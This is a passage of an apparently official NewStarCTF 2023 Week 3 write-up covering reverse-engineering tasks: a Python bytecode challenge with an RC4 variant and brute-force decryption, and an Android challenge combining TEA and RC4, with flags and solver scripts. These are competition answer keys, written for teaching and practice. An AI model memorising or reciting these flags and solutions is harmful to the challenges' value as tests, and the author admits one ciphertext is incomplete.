fakekey.pyc</span></div><div line="GYGk" data-language="python" class="ql-code-block"><br></div><div line="Vkrh" data-language="python" class="ql-code-block"><br></div></div><p ql-global="true" line="6aYJ">源码解读</p><div class="ql-code-block-container" data-language="python" spellcheck="false"><div line="uXzL" data-language="python" class="ql-code-block">首先是@change_fun2</div><div line="B1mF" data-language="python" class="ql-code-block"><span class="hljs-keyword">def</span> <span class="hljs-title function_">change_fun2</span>(<span class="hljs-params">fun</span>):</div><div line="MM8C" data-language="python" class="ql-code-block">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">real_fun</span>(<span class="hljs-params">*args</span>):</div><div line="OzoZ" data-language="python" class="ql-code-block">        ans = fun(*args)</div><div line="MI7r" data-language="python" class="ql-code-block">        ans.pop(<span class="hljs-built_in">eval</span>(<span class="hljs-built_in">eval</span>(eval_(<span class="hljs-string">b'YmFzZTY0LmI2NGRlY29kZQ=='</span>) + <span class="hljs-string">'(consefued2[0])'</span>)) - <span class="hljs-number">3</span>)</div><div line="Rbmd" data-language="python" class="ql-code-block">        ans.pop(<span class="hljs-built_in">eval</span>(<span class="hljs-built_in">eval</span>(eval_(<span class="hljs-string">b'YmFzZTY0LmI2NGRlY29kZQ=='</span>) + <span class="hljs-string">'(consefued2[5])'</span>)))</div><div line="RkaH" data-language="python" class="ql-code-block">        <span class="hljs-keyword">return</span> ans</div><div line="wizl" data-language="python" class="ql-code-block">    <span class="hljs-keyword">return</span> real_fun</div><div line="u6o6" data-language="python" class="ql-code-block">这是python的装饰器，简单理解是就是对被@的函数定制了某些功能，比如这里的pop</div></div><p ql-global="true" line="udmt">其中</p><div class="ql-code-block-container" data-language="python" word-wrap="" spellcheck="false"><div line="b4EE" data-language="python" class="ql-code-block ql-word-wrap-true">ans.pop(<span class="hljs-built_in">eval</span>(<span class="hljs-built_in">eval</span>(eval_(<span class="hljs-string">b'YmFzZTY0LmI2NGRlY29kZQ=='</span>) + <span class="hljs-string">'(consefued2[0])'</span>)) - <span class="hljs-number">3</span>)</div><div line="TLyB" data-language="python" class="ql-code-block ql-word-wrap-true">ans.pop(<span class="hljs-built_in">eval</span>(<span class="hljs-built_in">eval</span>(eval_(<span class="hljs-string">b'YmFzZTY0LmI2NGRlY29kZQ=='</span>) + <span class="hljs-string">'(consefued2[5])'</span>)))</div></div><p ql-global="true" line="2BCx">   那么pop了什么东西？</p><p ql-global="true" line="s07H">直接下断点看即可</p><p ql-global="true" line="lNPp"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="1048" height="auto" ori-width="1048" src="./NewStarCTF 2023 Week3 官方WriteUp_files/image(17).png" ori-height="231" data-src="https://uploader.shimo.im/f/pkUiGKf3vIoAkNQ2.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="K08o"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="1329" height="auto" ori-width="1329" src="./NewStarCTF 2023 Week3 官方WriteUp_files/image(18).png" ori-height="582" data-src="https://uploader.shimo.im/f/gtIOwM29RHjwvSPw.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="00zr">ans.pop(-3)</p><p ql-global="true" line="IePi">ans.pop(5)</p><p ql-global="true" line="0JTd">main函数是一个rc4只不过多异或了一个5</p><p ql-global="true" line="REeV">那么整体流程就不难理解了，rc4加密后,pop加密后的flag的第5和-3位，再base64一次</p><p ql-global="true" line="VngT"><br></p><p ql-global="true" line="6N4d">解密exp</p><div class="ql-code-block-container" data-language="python" spellcheck="false"><div line="291C" data-language="python" class="ql-code-block"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4</span>(<span class="hljs-params">plaintext</span>):</div><div line="7LEg" data-language="python" class="ql-code-block">    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))</div><div line="Z072" data-language="python" class="ql-code-block">    j = <span class="hljs-number">0</span></div><div line="4TBQ" data-language="python" class="ql-code-block">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):</div><div line="Iubm" data-language="python" class="ql-code-block">        j = (j + S[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span></div><div line="eAe7" data-language="python" class="ql-code-block">        S[i], S[j] = S[j], S[i]</div><div line="rIJd" data-language="python" class="ql-code-block">    <span class="hljs-comment"># 生成密钥流</span></div><div line="pxrj" data-language="python" class="ql-code-block">    i = j = <span class="hljs-number">0</span></div><div line="BgwW" data-language="python" class="ql-code-block">    keystream = []</div><div line="3Vy3" data-language="python" class="ql-code-block">    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(plaintext)):</div><div line="qIhP" data-language="python" class="ql-code-block">        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span></div><div line="uLrD" data-language="python" class="ql-code-block">        j = (j + S[i]) % <span class="hljs-number">256</span></div><div line="AnD4" data-language="python" class="ql-code-block">        S[i], S[j] = S[j], S[i]</div><div line="pZqF" data-language="python" class="ql-code-block">        k = S[(S[i] + S[j]) % <span class="hljs-number">256</span>]</div><div line="MKAO" data-language="python" class="ql-code-block">        keystream.append(k)</div><div line="1SMr" data-language="python" class="ql-code-block">    ciphertext = []</div><div line="t7KK" data-language="python" class="ql-code-block">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(plaintext)):</div><div line="T0fe" data-language="python" class="ql-code-block">        ciphertext.append(<span class="hljs-built_in">ord</span>(plaintext[i]) ^ keystream[i] ^ <span class="hljs-number">5</span>)</div><div line="SvKk" data-language="python" class="ql-code-block">    <span class="hljs-keyword">return</span> ciphertext</div><div line="r8KP" data-language="python" class="ql-code-block"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag</span>(<span class="hljs-params">data</span>):</div><div line="GFts" data-language="python" class="ql-code-block">    <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>.join([<span class="hljs-built_in">chr</span>(t) <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> data])</div><div line="0OGq" data-language="python" class="ql-code-block"><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">data</span>):</div><div line="ZcHF" data-language="python" class="ql-code-block">    llist = [<span class="hljs-built_in">ord</span>(<span class="hljs-built_in">chr</span>(t)) <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> data]</div><div line="ANGX" data-language="python" class="ql-code-block">    <span class="hljs-comment"># 18位flag</span></div><div line="hitS" data-language="python" class="ql-code-block">    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):</div><div line="xelc" data-language="python" class="ql-code-block">        <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):</div><div line="QxVQ" data-language="python" class="ql-code-block">            tmp_list = llist[:<span class="hljs-number">5</span>]+ [a] +llist[<span class="hljs-number">5</span>:-<span class="hljs-number">2</span>]+ [ b,llist[-<span class="hljs-number">2</span>],llist[-<span class="hljs-number">1</span>]]</div><div line="hL8U" data-language="python" class="ql-code-block">            string_tmp = <span class="hljs-string">""</span>.join([<span class="hljs-built_in">chr</span>(t) <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> tmp_list])</div><div line="cnVC" data-language="python" class="ql-code-block">            fake_ = get_flag(rc4(string_tmp))</div><div line="ffmq" data-language="python" class="ql-code-block">            <span class="hljs-keyword">if</span> hashlib.md5(fake_.encode()).hexdigest()[:<span class="hljs-number">6</span>] == <span class="hljs-string">"cbd746"</span>:</div><div line="pGll" data-language="python" class="ql-code-block">                <span class="hljs-built_in">print</span>(fake_)</div><div line="xSLn" data-language="python" class="ql-code-block">a = <span class="hljs-string">b'IMKJw4jCkgQxw6A1w5QRw7A5SG14wobDs8KF'</span></div><div line="2fHH" data-language="python" class="ql-code-block"><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode2</span>(<span class="hljs-params">encoded_str</span>):</div><div line="QbFZ" data-language="python" class="ql-code-block">    decoded_bytes = base64.b64decode(encoded_str)</div><div line="13zO" data-language="python" class="ql-code-block">    decoded_str = decoded_bytes.decode()</div><div line="gwTK" data-language="python" class="ql-code-block">    <span class="hljs-keyword">return</span> [<span class="hljs-built_in">ord</span>(t) <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> decoded_str]</div><div line="ehDS" data-language="python" class="ql-code-block">decode(decode2(a))</div></div><p ql-global="true" line="lqop"><br></p><p ql-global="true" line="hjmC"><br></p><p ql-global="true" line="STve"><br></p><h1><div ql-global="true" line="OkT0" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>2hard2u</div></h1><ul data-list-style="circle"><li ql-global="true" line="zWAl" class="bullet-item"><strong>考点</strong>: <span class="ql-font-microsoftyahei">Java层使用BlackObfuscator进行混淆的rc4，native层为md5</span></li></ul><ul data-list-style="circle"><li ql-global="true" line="pa2V" class="bullet-item"><strong>FLAG</strong>：<span class="ql-font-microsoftyahei">flag{G0ddamn700h@rd_f0ru_n0w!!!}</span></li></ul><ul data-list-style="circle"><li ql-global="true" line="5hm1" class="bullet-item"><strong>解题步骤</strong></li></ul><p ql-global="true" line="7cjq">先解tea</p><div class="ql-code-block-container" data-language="cs" spellcheck="false"><div line="9xbe" data-language="cs" class="ql-code-block"><span class="hljs-meta">#include &lt;stdio.h&gt;&nbsp;&nbsp;</span></div><div line="W9AW" data-language="cs" class="ql-code-block"><span class="hljs-meta">#include &lt;stdint.h&gt;&nbsp;&nbsp;</span></div><div line="wZvi" data-language="cs" class="ql-code-block"><br></div><div line="CdT9" data-language="cs" class="ql-code-block"><span class="hljs-comment">//解密函数&nbsp;&nbsp;</span></div><div line="3EmE" data-language="cs" class="ql-code-block"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">decrypt</span>(<span class="hljs-params">uint32_t* v, uint32_t* k</span>)</span> {</div><div line="NaVu" data-language="cs" class="ql-code-block">&nbsp; &nbsp; uint32_t v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>], sum = <span class="hljs-number">0xC6EF3720</span>, i;&nbsp; <span class="hljs-comment">/* set up */</span></div><div line="yYRx" data-language="cs" class="ql-code-block">&nbsp; &nbsp; uint32_t delta = <span class="hljs-number">0x9e3779b9</span>;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="hljs-comment">/* a key schedule constant */</span></div><div line="yeQD" data-language="cs" class="ql-code-block">&nbsp; &nbsp; uint32_t k0 = k[<span class="hljs-number">0</span>], k1 = k[<span class="hljs-number">1</span>], k2 = k[<span class="hljs-number">2</span>], k3 = k[<span class="hljs-number">3</span>];&nbsp; &nbsp;<span class="hljs-comment">/* cache key */</span></div><div line="LPHk" data-language="cs" class="ql-code-block">&nbsp; &nbsp; <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) {&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="hljs-comment">/* basic cycle start */</span></div><div line="dx2D" data-language="cs" class="ql-code-block">&nbsp; &nbsp; &nbsp; &nbsp; v1 -= ((v0 &lt;&lt; <span class="hljs-number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="hljs-number">5</span>) + k3);</div><div line="gjyS" data-language="cs" class="ql-code-block">&nbsp; &nbsp; &nbsp; &nbsp; v0 -= ((v1 &lt;&lt; <span class="hljs-number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="hljs-number">5</span>) + k1);</div><div line="56ro" data-language="cs" class="ql-code-block">&nbsp; &nbsp; &nbsp; &nbsp; sum -= delta;</div><div line="HsyR" data-language="cs" class="ql-code-block">&nbsp; &nbsp; }&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="hljs-comment">/* end cycle */</span></div><div line="0yGk" data-language="cs" class="ql-code-block">&nbsp; &nbsp; v[<span class="hljs-number">0</span>] = v0; v[<span class="hljs-number">1</span>] = v1;</div><div line="pbWb" data-language="cs" class="ql-code-block">}</div><div line="5Tmm" data-language="cs" class="ql-code-block"><br></div><div line="paAB" data-language="cs" class="ql-code-block"><span class="hljs-function"><span class="hljs-built_in">int</span> <span class="hljs-title">main</span>()</span></div><div line="jwjg" data-language="cs" class="ql-code-block">{</div><div line="0Ndu" data-language="cs" class="ql-code-block">&nbsp; &nbsp; uint32_t v[<span class="hljs-number">12</span>] = { <span class="hljs-number">1709447429</span>,<span class="hljs-number">319073545</span>,<span class="hljs-number">933829062</span>,<span class="hljs-number">996866537</span>,<span class="hljs-number">2967913332</span>,<span class="hljs-number">1503747157</span>,<span class="hljs-number">2184587230</span>,<span class="hljs-number">4251507117</span>,<span class="hljs-number">351303914</span>,<span class="hljs-number">3390489858</span>,<span class="hljs-number">1838058664</span>,<span class="hljs-number">2531479130</span> }, k[<span class="hljs-number">4</span>] = { <span class="hljs-number">5</span>,<span class="hljs-number">2</span>,<span class="hljs-number">7</span>,<span class="hljs-number">5</span> };</div><div line="xWnG" data-language="cs" class="ql-code-block">&nbsp; &nbsp; uint32_t i;</div><div line="iNnb" data-language="cs" class="ql-code-block">&nbsp; &nbsp; uint32_t temp[<span class="hljs-number">2</span>];</div><div line="tjb2" data-language="cs" class="ql-code-block">&nbsp; &nbsp; <span class="hljs-built_in">int</span> len = <span class="hljs-number">12</span>;</div><div line="Qgpu" data-language="cs" class="ql-code-block"><br></div><div line="R7v2" data-language="cs" class="ql-code-block"><br></div><div line="86ik" data-language="cs" class="ql-code-block">&nbsp; &nbsp; <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; len; i += <span class="hljs-number">2</span>)</div><div line="en5R" data-language="cs" class="ql-code-block">&nbsp; &nbsp; {</div><div line="Nvaj" data-language="cs" class="ql-code-block"><br></div><div line="5v79" data-language="cs" class="ql-code-block">&nbsp; &nbsp; &nbsp; &nbsp; temp[<span class="hljs-number">0</span>] = v[i];</div><div line="HrZD" data-language="cs" class="ql-code-block">&nbsp; &nbsp; &nbsp; &nbsp; temp[<span class="hljs-number">1</span>] = v[i + <span class="hljs-number">1</span>];</div><div line="hlRB" data-language="cs" class="ql-code-block">&nbsp; &nbsp; &nbsp; &nbsp; decrypt(temp, k);</div><div line="Qpvm" data-language="cs" class="ql-code-block"><br></div><div line="sDXx" data-language="cs" class="ql-code-block">&nbsp; &nbsp; &nbsp; &nbsp; printf(<span class="hljs-string">"0x%x,0x%x,"</span>, temp[<span class="hljs-number">0</span>], temp[<span class="hljs-number">1</span>]);</div><div line="sTyN" data-language="cs" class="ql-code-block">&nbsp; &nbsp; }</div><div line="lW7I" data-language="cs" class="ql-code-block"><span class="hljs-comment">//&nbsp;0x88c30106, 0xbdc2acc3, 0xaec2b8c2, 0xc313a2c2, 0xc3bcc3a2, 0xc32807ab, 0x87c2438f, 0x9dc394c2, 0x95c26c54, 0xa1c385c3, 0x5d86c253, 0xc2bcc378</span></div></div><p ql-global="true" line="5vM7">这里会产生一个端序问题，需要手动转换一下</p><p ql-global="true" line="pFhX">转换完成后大概是</p><p ql-global="true" line="nV5Z">0x6,0x1,0xc3,0x88,0xc3,0xac,0xc2,0xbd,0xc2,0xb8,0xc2,0xae,0xc2,0xa2,0x13,0xc3,0xa2,0xc3,0xbc,0xc3,0xab,0x7,0x28,0xc3,0x8f,0x43,0xc2,0x87,0xc2,0x94,0xc3,0x9d,0x54,0x6c,0xc2,0x95,0xc3,0x85,0xc3,0xa1,0x53,0xc2,0x86,0x5d,0x78,0xc3,0xbc,0xc2</p><p ql-global="true" line="aLZd">然后就会发现和java层的输入长度不一致，这是因为在java字符串传递到jni接口时，采用了GetStringUtfChars，这个函数会自动采用utf-8的解码格式。utf-8是变长解码方式，java层采用的是16位一个char。而c中是8位。所以utf-8解密的时候需要2组一起</p><p ql-global="true" line="9tTK">丢到解密网站解密（不想写脚本</p><p ql-global="true" line="vySv">&nbsp;<a class="ql-link" href="https://gchq.github.io/CyberChef/?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgxNTMxMTIsImZpbGVHVUlEIjoiUVBNUnh6R2t0enNabnpoeiIsImlhdCI6MTY5ODE1MjgxMiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjotODMzMzU1NDY5MH0.DCaFYw7V0Y72gh5281Lf_LZXMwp5i0HBVhaQ3_UA3rU" target="_blank" rel="noopener noreferrer nofollow">CyberChef (gchq.github.io)</a></p><blockquote line="ayGf"><div ql-global="true" class="ql-blockquote-item">ps：这里出题的时候代码写糊了。密文长度不对，缺了flag最后3位 orz，解题出来的flag不全，orz。</div></blockquote><p ql-global="true" line="sUpy">可以得到数组</p><p ql-global="true" line="3G45">0x06,0x01,0xc8,0xec,0xbd,0xb8,0xae,0xa2,0x13,0xe2,0xfc,0xeb,0x07,0x28,0xcf,0x43,0x87,0x94,0xdd,0x54,0x6c,0x95,0xc5,0xe1,0x53,0x86,0x5d,0x78,0xfc,0xa8,0x38,0x5d</p><div class="ql-code-block-container" data-language="python" spellcheck="false"><div line="CzC4" data-language="python" class="ql-code-block"><br></div><div line="wYIR" data-language="python" class="ql-code-block"><br></div><div line="abpf" data-language="python" class="ql-code-block"><span class="hljs-keyword">def</span> <span class="hljs-title function_">KSA</span>(<span class="hljs-params">key</span>):</div><div line="BpIC" data-language="python" class="ql-code-block">&nbsp; &nbsp; key_length = <span class="hljs-built_in">len</span>(key)</div><div line="W5oz" data-language="python" class="ql-code-block">&nbsp; &nbsp; S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))</div><div line="ZAL8" data-language="python" class="ql-code-block">&nbsp; &nbsp; j = <span class="hljs-number">0</span></div><div line="QTo1" data-language="python" class="ql-code-block">&nbsp; &nbsp; <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):</div><div line="CQJo" data-language="python" class="ql-code-block">&nbsp; &nbsp; &nbsp; &nbsp; j = (j + S[i] + key[i % key_length]) % <span class="hljs-number">256</span></div><div line="jpBR" data-language="python" class="ql-code-block">&nbsp; &nbsp; &nbsp; &nbsp; S[i], S[j] = S[j], S[i]</div><div line="tvpG" data-language="python" class="ql-code-block">&nbsp; &nbsp; <span class="hljs-keyword">return</span> S</div><div line="GN5N" data-language="python" class="ql-code-block"><span class="hljs-keyword">def</span> <span class="hljs-title function_">PRGA</span>(<span class="hljs-params">S</span>):</div><div line="22W9" data-language="python" class="ql-code-block">&nbsp; &nbsp; i = <span class="hljs-number">0</span></div><div line="MOgb" data-language="python" class="ql-code-block">&nbsp; &nbsp; j = <span class="hljs-number">0</span></div><div line="ga85" data-language="python" class="ql-code-block">&nbsp; &nbsp; <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:</div><div line="OMT1" data-language="python" class="ql-code-block">&nbsp; &nbsp; &nbsp; &nbsp; i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span></div><div line="JFt2" data-language="python" class="ql-code-block">&nbsp; &nbsp; &nbsp; &nbsp; j = (j + S[i]) % <span class="hljs-number">256</span></div><div line="pYMn" data-language="python" class="ql-code-block">&nbsp; &nbsp; &nbsp; &nbsp; S[i], S[j] = S[j], S[i]</div><div line="kOrq" data-language="python" class="ql-code-block">&nbsp; &nbsp; &nbsp; &nbsp; K = S[(S[i] + S[j]) % <span class="hljs-number">256</span>]</div><div line="KwhD" data-language="python" class="ql-code-block">&nbsp; &nbsp; &nbsp; &nbsp; <span class="hljs-keyword">yield</span> K</div><div line="k53L" data-language="python" class="ql-code-block"><span class="hljs-keyword">def</span> <span class="hljs-title function_">RC4</span>(<span class="hljs-params">key</span>):</div><div line="IHcD" data-language="python" class="ql-code-block">&nbsp; &nbsp; <span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">data</span>):</div><div line="CaWk" data-language="python" class="ql-code-block">&nbsp; &nbsp; &nbsp; &nbsp; data_length = <span class="hljs-built_in">len</span>(data)</div><div line="nSDN" data-language="python" class="ql-code-block">&nbsp; &nbsp; &nbsp; &nbsp; keystream = PRGA(KSA(key))</div><div line="fcbT" data-language="python" class="ql-code-block">&nbsp; &nbsp; &nbsp; &nbsp; res = []</div><div line="ZNbR" data-language="python" class="ql-code-block">&nbsp; &nbsp; &nbsp; &nbsp; <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(data_length):</div><div line="ldKe" data-language="python" class="ql-code-block">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; res.append(<span class="hljs-built_in">next</span>(keystream) ^ data[i])</div><div line="Zq9V" data-language="python" class="ql-code-block">&nbsp; &nbsp; &nbsp; &nbsp; <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(res)</div><div line="zZNg" data-language="python" class="ql-code-block">&nbsp; &nbsp; <span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">data</span>):</div><div line="KeOT" data-language="python" class="ql-code-block">&nbsp; &nbsp; &nbsp; &nbsp; <span class="hljs-keyword">return</span> encrypt(data)</div><div line="JrVt" data-language="python" class="ql-code-block">&nbsp; &nbsp; <span class="hljs-keyword">return</span> encrypt, decrypt</div><div line="x0zp" data-language="python" class="ql-code-block"><br></div><div line="gWX5" data-language="python" class="ql-code-block">blist=[<span class="hljs-number">0x06</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0xc8</span>,<span class="hljs-number">0xec</span>,<span class="hljs-number">0xbd</span>,<span class="hljs-number">0xb8</span>,<span class="hljs-number">0xae</span>,<span class="hljs-number">0xa2</span>,<span class="hljs-number">0x13</span>,<span class="hljs-number">0xe2</span>,<span class="hljs-number">0xfc</span>,<span class="hljs-number">0xeb</span>,<span class="hljs-number">0x07</span>,<span class="hljs-number">0x28</span>,<span class="hljs-number">0xcf</span>,<span class="hljs-number">0x43</span>,<span class="hljs-number">0x87</span>,<span class="hljs-number">0x94</span>,<span class="hljs-number">0xdd</span>,<span class="hljs-number">0x54</span>,<span class="hljs-number">0x6c</span>,<span class="hljs-number">0x95</span>,<span class="hljs-number">0xc5</span>,<span class="hljs-number">0xe1</span>,<span class="hljs-number">0x53</span>,<span class="hljs-number">0x86</span>,<span class="hljs-number">0x5d</span>,<span class="hljs-number">0x78</span>,<span class="hljs-number">0xfc</span>,<span class="hljs-number">0xa8</span>,<span class="hljs-number">0x38</span>,<span class="hljs-number">0x5d</span>]</div><div line="nZN0" data-language="python" class="ql-code-block">key = <span class="hljs-string">b'friedchick'</span></div><div line="dFqO" data-language="python" class="ql-code-block">encrypt_func, decrypt_func = RC4(key)</div><div line="lwZR" data-language="python" class="ql-code-block">data_to_encrypt=<span class="hljs-built_in">bytes</span>(blist)</div><div line="Ury4" data-language="python" class="ql-code-block">encrypted_data=encrypt_func(data_to_encrypt)</div><div line="pEL5" data-language="python" class="ql-code-block"><span class="hljs-built_in">print</span>(<span class="hljs-string">'Encrypted Data:'</span>, encrypted_data,(<span class="hljs-built_in">len</span>(encrypted_data)))</div></div><p ql-global="true" line="lAQI"><br></p><p ql-global="true" line="IavI"><br></p></div><script>
function setTransform(el, scale) {
  var prefix = ["ms", "webkit", ""];

  prefix.forEach(function (str) {
    var name = str ? str + "Transform" : "transform";
    el.style[name] = "scale(" + scale + ")";
    el.style[name + "Origin"] = "left center";
  });
}
document.querySelectorAll(".auto-scale").forEach(function (el) {
  var scale = Math.min(el.clientWidth / el.scrollWidth, 1);

  if (scale < 1) {
    setTransform(el, scale);
    el.style.overflow = 'visible';
    el.style.textOverflow = 'inherit';
  }
});
</script><script>
function fixVerticalAlign(el) {
  if (el && el.classList && el.classList.contains('ql-formula-embed')) {
    var contentNode = el.querySelector('.ql-formula-content')
    el.style.marginBottom = '-3px'
    el.style.verticalAlign = 'text-bottom'
    if (contentNode) {
      contentNode.style.verticalAlign = 'bottom'
    }
  }
}
document.querySelectorAll('.ql-blot-gallery-embed').forEach(function (el) {
  while (el && el.tagName !== 'P') {
    fixVerticalAlign(el.nextSibling)
    fixVerticalAlign(el.previousSibling)
    el = el.parentNode
  }
})

// 修复 dataset
document.querySelectorAll('.ql-formula-embed').forEach(function (el) {
  var input = el.querySelector('input');
  el.dataset.value = decodeURIComponent(input && input.value || '');
})
</script>
                <ul class="ql-gallery-contextmenu"><li class="ql-gallery-menu-item">复制图片</li><li class="ql-gallery-menu-item">下载图片</li></ul><div class="ql-link-toolbar ql-popup">
      <span class="ql-link-toolbar-button" data-name="fullscreen"></span>
      <span class="ql-link-toolbar-button" data-name="open-link"></span>
      <span class="ql-link-toolbar-button" data-name="preview"></span>
      <span class="ql-link-toolbar-button" data-name="download"></span>
      <span class="ql-link-toolbar-button" data-name="download-audio"></span>
      <span class="ql-link-toolbar-button" data-name="code-block-lang"></span>
    </div><div class="toolbar-tip hidden"><div class="toolbar-format-tip"></div></div><div class="ql-table-of-content" style="top: 51px; height: calc(100% - 51px); width: 315px; margin-left: -315px;"><div id="new-directory" class="table-of-content"><div class="doc-directory-menu"><div class="doc-directory-menu-line"></div><div class="doc-directory-menu-line"></div><div class="doc-directory-menu-line"></div></div><div class="new-doc-directory"><div class="doc-directory-title"><span>目录</span><span class="doc-directory-close"><!--?xml version="1.0" encoding="utf-8"?--> <svg data-name="Layer 1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.6 15.6"> <path d="M9.2 7.8l6.4-6.4L14.2 0 7.8 6.4 1.4 0 0 1.4l6.4 6.4L0 14.2l1.4 1.4 6.4-6.4 6.4 6.4 1.4-1.4z" fill="#a5a5a5"> </path> </svg> </span></div><div class="doc-directory-content ps"><ul class="doc-directory-list has-heading-4 has-heading-3 has-more-title"><li class="toc-entry heading-4 header-indent-undefined hasChildren" data-index="0" data-offset="20"><span class="icon-collapsed"><!--?xml version="1.0" encoding="utf-8"?--> <svg version="1.1" id="图层_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 10 10" style="enable-background:new 0 0 10 10" xml:space="preserve"> <g id="Artboard"> <polygon id="Triangle-3-Copy-13" style="fill:#a5a5a5" points="8,5.5 3,9 3,2 	"></polygon> </g> </svg> </span><div class="dic-text">Web</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="1" data-offset="84"><div class="dic-text">POP Gadget</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="2" data-offset="2438"><div class="dic-text">Include 🍐</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="3" data-offset="3562"><div class="dic-text">GenShin</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="4" data-offset="3863"><div class="dic-text">R!!!C!!!E!!!!</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="5" data-offset="4691"><div class="dic-text">OtenkiGirl</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="6" data-offset="7499"><div class="dic-text">medium_sql</div></li><li class="toc-entry heading-4 header-indent-undefined hasChildren" data-index="7" data-offset="9500"><span class="icon-collapsed"><!--?xml version="1.0" encoding="utf-8"?--> <svg version="1.1" id="图层_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 10 10" style="enable-background:new 0 0 10 10" xml:space="preserve"> <g id="Artboard"> <polygon id="Triangle-3-Copy-13" style="fill:#a5a5a5" points="8,5.5 3,9 3,2 	"></polygon> </g> </svg> </span><div class="dic-text">Pwn</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="8" data-offset="9564"><div class="dic-text">stack_migration_revenge</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="9" data-offset="12079"><div class="dic-text">srop</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="10" data-offset="13386"><div class="dic-text">dlresolve</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="11" data-offset="14991"><div class="dic-text">orw&amp;rop</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="12" data-offset="16334"><div class="dic-text">puts or system?</div></li><li class="toc-entry heading-4 header-indent-undefined hasChildren" data-index="13" data-offset="17233"><span class="icon-collapsed"><!--?xml version="1.0" encoding="utf-8"?--> <svg version="1.1" id="图层_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 10 10" style="enable-background:new 0 0 10 10" xml:space="preserve"> <g id="Artboard"> <polygon id="Triangle-3-Copy-13" style="fill:#a5a5a5" points="8,5.5 3,9 3,2 	"></polygon> </g> </svg> </span><div class="dic-text">Misc</div></li><li class="toc-entry heading-3 header-indent-undefined" data-index="14" data-offset="17297"><div class="dic-text">阳光开朗大男孩</div></li><li 